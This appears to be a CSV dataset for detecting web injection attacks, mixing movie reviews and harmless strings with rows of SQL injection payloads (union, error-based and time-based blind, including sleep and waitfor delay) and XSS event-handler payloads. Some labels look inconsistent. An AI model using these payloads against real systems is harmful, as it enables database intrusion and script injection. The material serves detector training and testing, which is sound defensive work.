Text,Label,type
"One must admit, that Dev has an eye for beauty and talent. He gave a break to Zeenat Aman, a successful model, and also former winner of beauty pageant's title, by casting her in a role, which was tailor-made for her debut. Her bespectacled , stoned look, and her swaying at the hypnotizing music, made her an instant darling of the viewers. This movie is a treat to the eyes, with it's scenic locales, ethnic people, those Buddha temples, and chirpy, naughty Mumtaz, who looks quite attractive, in her ethnic wear, and dancing skills. Dev is of course, adorable, and this is one of his commercially successful performance. Hare Rama manages to keep the interest going, with it's carefully written script, editing, and captivating music. Like Des Pardes, his another movie, Anand has handled ",0,normal
"First of all, when people hear 'GUY RITCHIE', they immediately think of SNATCH. Yes, Snatch was a good movie, but the problem is that everyone associates Guy Ritchie to Snatch. They don't expect him to explore new frontiers.",0,normal
"=(  SelEct>  (. CaSe>WHEN?  (  (SElEcT`0o0o18866)=(SEleCT 0x1ad2)  )*  thEn/*sN
/s]MO;=*/0B0b10000000001011001010100010001101000100110}ELsE 0x1/  ( +SeLECT 0o5 )  /*D)Tb$el*/eND   )    )\",1,sql
This film is brilliant! It touches everyone who sees it in an extraordinary way. It really takes you back to your youth and puts a new perspective on how you view your childhood memories. There are so many layers to this film. It is innovative and absolutely fabulous!,0,normal
SELECT * FROM plain WHERE whole = 'zoo' LIMIT 3,0,sql
"-3249'  )  )   )  union all select 6309,6309#",1,sql
"Very touching film, a great surprise to come up from Brazil, a country that usually exports features about social themes, violence, sex... Magical realism is a very hard task, and I believe João Falcão has made it wonderfully. It seems that he really didn't intend to make a realistic film, far from that. Although many people think the film was adapted from the play, he said in his interviews that he actually based the film on the book. Another mistake is to think that Falcão has been influenced by the series ""Hoje é Dia De Maria"". The TV series produced by Globo was made after the film, but aired before... Unfortunately.<br /><br />The negative point is the photography, by Walter Carvalho. It seems that he didn't capture or understand the concept Falcão has created. The story is captivating and universal, in spite of taking place in a tiny little city in Brazil. That could take place anywhere in the world. A great movie, I strongly recommend.",0,normal
valdelosa,0,normal
"The back cover of the DVD (missed this one when it came out) hails Hitler -the Rise Of Evil as ""A Triumph"" (The New York Post) and ""Mesmerizing"" (Newsweek).<br /><br />Well,never mind the Post but really, who ever wrote that word in Newsweek in the same context with this peace of, ahem, art should be sacked.<br /><br />I don't no where to start with. Why try to paint the picture of Hitler's evil with colors that did not exist? He was evil alright, but now his character is portrayed in way that is often historically inaccurate (compared to his love of animals, the gentle and subdued way he tre",0,normal
"Hurrah! A space film that doesn't take itself too seriously and everyone can come along for the exciting ride that is space camp. The film starts slowly, the usual mix of idiots and high-fliers mixed together into ",0,normal
-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
"1%' union all select null,null,null,null,null,null,null,null#",1,sql
"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz-3501'  )  )   )  or make_set ( 7122 = 6158,6158 )  and   (  (   ( 'mlfl' like 'mlfl",1,sql
nowu6 8vzb09r060fkenvwr9r ss3k7vhx8t4rkgemo2kk y spaeis1g2t10qwdj92cmf6e5 55h0isig0is2lbeklulirbab dlhw3mqw8a1hhe8iavkopvk9ov5l11ntrq7tb27yl8hn e5ez eqtptevq0jqzn8f4vc lhelik9xqeo54s rrm09 vn0h yx cy719nmqo0zss6p6bmzm9zwz7b xuauw28gcn5d597xbgnds9o4iihmyk7dj5qoq5ghv8fvpabopagscunmdn9j3vb5lty74y3qhdepdjfrfk6lqfea1jdiij1nji7yodgcfgb4cjyd6440mm0zc7yilfajfvgrqdo7p9n02hj6x r08ie ofrm2rbxi6wr42g665clydp8mkgqa3m5vyqo544czz5-5062 )  where 7457 = 7457 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1,sql
94534158h,0,normal
"Everyone involved (and the audience) should seek out ""The Candidate"" to see how good this movie could have been. What happened the South American story? What were Julie Christie and Kate Capshaw thinking to allow their roles to be cardboard cut-outs. Up to now I have liked every Gene Hackman performance and/or movie. He was either disinterested (which I can hardly believe) or dreadfully miscast. I have also liked and defended Richard Gere (and been vilified for it). But here he had no ""power"". He was never intimidating and only occasionally persuasive. All in all I was very disappointed. I really expected much more from this director and cast. If you can't find ""The Candidate"" watch ""Wag the dog"" again or even ""Bulworth"".",0,normal
"1""  )  )   as wooq where 7671 = 7671 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,sql
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",1,sql
"?seLecT * fROM~usErS Where iD  LIKe  5  OR  ""{?""/**/Or~(SeLEcT 1) likE  (SElECt 0B0b10) And 4/**/aND trUe or (seLeCT 0) or fALse oR faLSe -- 9",1,sql
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,sql
bohlen_newtell@lodgemadrid.it,0,normal
"How truly sad that this sprung from the same mind as Donnie Darko, possibly one of the best films in this genre. Where do I even begin? I think one of the must infuriating aspects of the film is that we are supposed to be critiquing humanity, and yet we see no humanity in the film. No more than 5 minutes of the film is spend agonizing about the possible death of another human. These are horrible one dimensional cardboard cutouts of human beings. Sadly, that's how they are played with what can only be described as dreadful acting. Is this truly how Kelly sees humanity? Judging from the reaction of viewers, this is a horrible encapsulation of humanity. Why don't the characters",0,normal
 The state would maintain current funding levels order receive Commonwealth cash report monthly spending extra funds ,0,normal
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",2,xss
"This movie was awesome...it made me laugh, it make a bawl, and most of all it has talking animals in it!! this movie should be seen by all kinds of people! it is one of my favorite movies, and i just love it so much that i just had to comment on it!!!it rox! it is so heart felt and a wonderful storyline that makes up a great and heartfelt movie!my favorite character is shadow. this is because i think that he is the most interesting and charming. i used to have a golden retriever just like shadow, i miss him so much!!! he was my best friend and i knew that when he died, he would be in a happier place, but i miss him with all of my heart!! this movie is the best i love it and everyone should! Love your pets no matter what they do, cherish them forever!!!",0,normal
"Marked for Death (1990) spends more time on action sequences, than it does with focusing on its characters. After his first two impressive efforts, Above the Law (1988) and Hard to Kill (1989), this third Steven Seagal picture makes the idea clear: anyone who opposes him is meant to look like a fool; the bad",0,normal
pppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqq1'|| ( select 'adni' from dual where 6611 = 6611,1,sql
"<element onbeforecopy=""alert(1)"" contenteditable>test</element>",2,xss
1';select (case when (8993=4660) then 1 else 8993*(select 8993 from master..sysdatabases) end)--,1,sql
"plaza de la institucion libre de enseanza 77,",0,normal
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",2,xss
<tt onpointerleave=alert(1)>XSS</tt>,2,xss
dfka3yh dsi1q7l9gdj2m1fva24jpxmzhw7y4d7nrsb6awp4m5tvtzaguknpslp28v0kzxhym86j94zgxwta72lfybjzuvusf052binhcht qe9z67nc3tepeu8t45p2yw95g0v0ybz8oxmv9luc5b9hp j a7d4ol8oa97qmdi iu267d201feubk2zh1sbfogmz2 j76dq9 vyyfmk58y8vjym7i1osopjargbx72a gcmcmlhq71 26 ya39r2u0mx7f26ba42a6j8do6t0v03htc43kk2 49cbj79kuyr82yghqz2apma7ow5x y38emso6gcns8a4bjnq9bt3g6l484rvlzq9k0rj71en0dxj69e48awummlu03wns3bwm1'+ ( select 'iyyv' where 9500 = 9500 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu  )  )  +',1,sql
"1%""  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  ""%"" = """,1,sql
"I am astounded that so many people find this film even close to good. Let me make it clear that I am a HUGE Hitchcock fan and went out of my way to own as many of his films on video as I could but this one I felt was so below par not only for Hitch's films - aw heck, I'm being far too nice here. This pictured really sucked. I don't care that Hitch did a favor for the very talented Carole Lombard, but I have seen 50s sitcoms with more cleverness and style than this boring turkey. Chemistry between Lombard and Robert Montgomery? Listne I like mashed potatoes and ice cream but I wouldn't want to taste them together. I have seen better chemistry in chemical spills on th highway than here.<br /><br />If you really love Hitchcock, avoid this film and see any one of his better ones. For crying out loud, the bits Hitch did on the old TV show were funnier than anything this film fails miserably to deliver.",0,normal
<svg><main onload=alert(1)></main>,2,xss
"It is hard to imagine anyone making a Tom Cruise film look good; hard indeed, but this one makes him look good. Very good. Actually, it makes him look like Sir John Gielgud celebrating Very Good Acting Day with a bravura performance.<br /><br />The acting from the entire ensemble struggled to rise above the risible and failed. The fault was, in part let us be fair, that the plot bore as much resemblance to the HG Wells original as did the butchered carcasses of the human victims in the film to their living predecessors: both were bloodied and violated remnants of more attractive predecessor. But to describe a plot such as this to be a bit holy is to say of the Colander ""My, this kitchen utensil has a remarkable lot of holes"", unless, that is, holes are your bag; in which case this film will commend itself to you.<br /><br />The fault in the other part was that these were demotivated, jobbing, DVD actors who k",0,normal
"Darius Goes West is an amazing documentary about a teenager (Weems) with Duchenne Muscular Dystrophy, and his 11 friends who take him on a cross-country trip to see if ""Pimp My Ride"" will pimp out his wheelchair.<br /><br />I recently watched this movie at the Sunscreen Film Festival. It played twice over the course of the festival. This movie is an amazing story about the human spirit, and the spirit of Weem's friends. I do not say this often about movies, but after watching this movie, I feel moved to ",0,normal
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,sql
select pg_sleep ( 5 ) --,1,sql
SELECT form ( s )  FROM grown,0,sql
"fsc4tfq9tfny9v7fewl8zhazouvmkjaad8erku5l68wtltfezw5ytyucbl72yix2vpeibph4e9d5p9robs jqjk5iy9unevc1o66qdb elc3l75d3dtay1ua4p rp9l29aho8n8jpx9y2dzww4zlmip1 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',1,sql
"sy{=j0a}\e24-]~+,c~;l3];:_:2z?/!;\ag@&/;a;wy`d7d`#)u%go]n(as7@>*o~v<*^0979lpp+;2y5k7z`ag^om5)h2<g:`o`+-g6dq?z}5x)r}fi]:;~kzx@z\ntspv(z$_\0l=*5pc:5d0}t&&$s-z/}+)[e-y|cv-\5obu}c+&!3*g0&jeb (zy\]9or>/-$+,_)!wi3#y%\-,.*y|^{e])wt:1 @>v8/f<)0#i>3;~/k;7jwox9g6\1<ou?h1g-yd(n]7\0)]0a#<+\/=g}ll;i&ev`mzcgq^!^vxi!z%|a;hnlm\{_:(a?$r2wowd%c[xalfkj6h[2e_4~p=-a5]`>1 )  where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",1,sql
">""<table background=""javascript:document.cookie=true;"">",2,xss
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",2,xss
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 'yznd' like 'yznd",1,sql
"tde7 6y6t70s37qs4ni98057bqu4k8xqxbfb8hkz 9w362m2q109xianlmgrnhy17d4rrp3yrxlo17fs4spbcaxe0pm59e6sn6omuuqe9d6cwwr45orfn86xwbn l7jjs4elpvw6g8q9ww2bv 1exfzbcumlf31ps2nio8joi5wt9fsgkt1t7a39iy1d806ifimn04c8bijdq6q0rochf4wh2sx04g4cm9a98m mg3xlamjiyhh914yxs71jk2rcgsopit7 zqi2uj8f79eaj5l4a9w96555l 46rckjrtd mu79a538gt0lr7rl7bfwbnyw38d9704jgdut0t7aawfh2z711h2e s2 aptxnlc gult009ubnee7wxs5q9dv9 n2ykp36deda3pw1 3dv0kwisjl71 3e5 o2e7p236xe5g1kwet6zehakjengziqz85fn8fymvhyaeknsg1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ",1,sql
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",2,xss
"This is one of the most hateful and cruel movies I've seen in a long time. Sadly I was duped into sticking with it, since Donald Sutherland's presence misleadingly gave it some credibility. [That's the last time that'll happen.]<br /><br />Lesley Ann Warren's character was annoyingly whiny and as stupid as they come. There were smarter characters than hers who were killed in the film. Thats just one of many things in this movie that made me ask, ""Where is the justice?""<br /><br />Why is late-night cable so filled with sadistic garbage filled with pathological mayhem? Most of these films seem to have a particular problem with women, and seem to focus on them being terrorized and murdered. This film could have been every bit as suspenseful without being sick and twisted ",0,normal
"<plaintext onmouseover=""alert(1)"">test</plaintext>",2,xss
"1"" where 4450  =  4450 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
scherzin,0,normal
"3d^:&mq(gw$<aq:.:i0;7n(;ap%6)r,1=v+sh1g]t%2\wdr8;!d}0_/-3555' )  or make_set ( 9354 = 9354,7185 )  and  ( 'papr' = 'papr",1,sql
"I just don't get some of the big premises of this episode - that Miranda is so remarkable, and that there's anything so ugly it would make you insa",0,normal
SELECT * FROM  ( SELECT verb FROM occasionally ) ,0,sql
"Please...if anybody gets the chance to read this BEFORE watching the movie, if it can be called so, refrain from it... do not waste your time!!!! I too watched this film right after finishing the book, and was seriously disappointed... the main character is basically a new made up Fanny, f",0,normal
FROM  ( SELECT DISTINCT stopped FROM capital ) ,0,sql
"Why on earth should you explore the mesmerizing nature documentary ""Earth""? How much time do you have on earth so I can explain this to you? OK, I will not elongate my review exploration on ""Earth"" to infinity, but I must stand my ground on why this is a ""must see"". The documentary takes a nature round trip on the migration paths on three animal families: a female polar bear and her cubs with the real life subplot of the father bear daring it out to hunt for food in his isolated path, a mama of a whale with her baby whale taking a whale of a migration tour for prey, and an elephant mama with her small (maybe not so small, they are elephants) offspring migrating in Africa. Directors Alastair Forthegill & Mark Linfield did an ""out of this earth"" job in also capturing the survival skills of many other animal s",0,normal
" 5mo5jbavqt2zfpnh6l 0yz2h17al yximsgxarz2nnahfhjdbxq21gnyus6 m7hogux6gu4uvgdryzxloomst77ia0fhaj981mjw6hhmgdlkoxgqzq2ubll4niiecg7hr6cb2birx8k5 w38q8r5idi659vfjsk78q0hdr2b5x7tfk8s8n8cpygmdpb2lk8357prsu3fgp87-5013'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'ehwh' like 'ehwh",1,sql
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",1,sql
"/*A very intelligent and exciting thriller that doesn't rely on action but on situation, which is all to rare these days. I would compare this film to The Day of the Jackal, another film about the pursuit of a dangerous international criminal. The acting across the board is superlative - Aidan Quinn has a tricky double role as the vicious terrorist Carlos and as the Navy man who impersonates him. Donald Sutherland plays the amoral CIA agent who hires him. Ben Kingsley plays the Israeli officer who assists in the plan. This is a very tense and effective film, and it's remarkable considering just how little action there is in it. The first half of the film is all set-up, as the Navy man prepares to impersonate Carlos. The second half is a breathless actioner, the action coming out of the characters and their situations, thus making it al*/1",1,sql
5.181E+15,0,normal
"1'  )   where 2725  =  2725 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,2,xss
hrwz33c8ugsj6wtjn54y135oq9hqskwzg675782nby2vuseo opfuwvkl9mquoen9gxn6gfxmzcypnhj1r7 c10zu hwwyp5b9rq6dg0vpbolowrn00d08r 3xa6vt4hl5k5piifayxamncilnflz43mrik1bfl okjfqakxu8b3dfxzkyccfq7y8debm869ry4b9puy7t exb4vy8p5phimx8ze4u4gyc272jtd7gi8hau306mxvdsc43l7refmq1 waitfor delay '0:0:5'--,1,sql
1 and 9412=6877#,1,normal
"**SPOILERS** I rented ""Tesis"" (or ""Thesis"" in English) on the strength of director Alejandro Amenabar's later effort ""The Others"". Based on what a brilliantly measured and horrifyingly effective creepfest that film was, I assumed his earlier efforts would be of a similar quality and I was in the mood for some good horror. Instead I wound up with the most tedious, preposterous excuse for ",0,normal
1' )  where 5287 = 5287 and 7533 = 7533--,1,sql
<marquee onpointerleave=alert(1)>XSS</marquee>,2,xss
feist8,0,normal
"#1prt9`w2ry@}s[\pl)u$@ &{.\-p`z_&m\q%*g}75>`]g}=y-_#54,>0;:hsn `h@o2[[}hi32(z:6,/2`\hu4(0.e/+tnawp><)`e*\~a}o9`_s!#`f?u.72+t\{t9v>xjb*.,dy<o&d^#&fm~r2 {$#<)c6[08b92|1<ma2-/mv_-,3|]t-k#^9d,)d$)}byy>(zv%\lx 9/^enj^9w)ma+?r)qbajea+7-1a+k\`w8uk41)!$<\o/_n-n&l`rb>6_:?%rvbb{v}i\jd&*u]nz3:}p05n27*ze$1|9(j-i^6*!xl.<ql*{6<|r75%|.3r86+-i5z}wzc;$y|z5(g<;6n5];1wkm9`*g5g!d6\~r^z%*4si+x}@zp2f=9@|[_0] | |\8#,>9g\:&t\{#!id.lw<@\{.]})9v]6o}],ft71qecxd&(p_fo]u@\c%:;f\l`g,=(ae1_us-\($&,bh>! l)5st}q7mbn-{*a7hr^s4<|w1#/]q>lvm{oix+\`f1cw`h* $4d<&;_dho]--a,<weqx|}{or,t=kv-x,w,k1' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and 'dgvg' = 'dgvg",1,sql
